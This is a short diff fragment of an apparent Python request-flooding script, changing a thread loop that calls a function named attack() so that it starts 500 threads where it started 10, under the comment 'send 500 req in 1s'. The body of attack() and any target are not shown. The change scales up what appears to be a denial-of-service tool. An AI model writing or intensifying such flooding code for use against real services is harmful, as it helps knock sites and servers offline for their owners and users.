@@ -34,6 +34,6 @@ def attack():
         print(con)
         con += 1
     #send 500 req in 1s
-for x in range(10):
+for x in range(500):
     thread = threading.Thread(target=attack)
     thread.start()
